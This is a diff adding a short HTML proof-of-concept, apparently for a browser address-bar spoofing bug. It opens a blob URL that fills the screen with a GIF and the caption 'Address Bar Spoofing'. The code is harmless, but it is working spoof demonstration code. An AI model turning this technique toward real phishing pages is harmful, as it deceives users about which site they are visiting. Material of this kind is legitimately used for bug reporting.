@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head><title>Blob PoC</title></head>
+<body>
+<h1>Opening blob URL...</h1>
+<script>
+  const content = `
+    <div style="
+      position:fixed;
+      inset:0;
+      background:#000;
+      display:flex;
+      flex-direction:column;
+      justify-content:center;
+      align-items:center;
+      font-family:Arial,sans-serif;
+    ">
+      <img
+        src="https://i.giphy.com/NmdU9DLL2ostigH2iW.webp"
+        style="width:400px; max-width:90vw;"
+      >
+      <div style="
+        margin-top:20px;
+        color:#fff;
+        font-size:48px;
+        font-weight:900;
+        letter-spacing:4px;
+        text-shadow:0 0 10px #fff;
+      ">
+        Address Bar Spoofing
+      </div>
+    </div>
+  `;
+
+  const blob = new Blob([content], { type: "text/html" });
+  const url = URL.createObjectURL(blob);
+  window.open(url);
+</script>
+</body>
+</html>
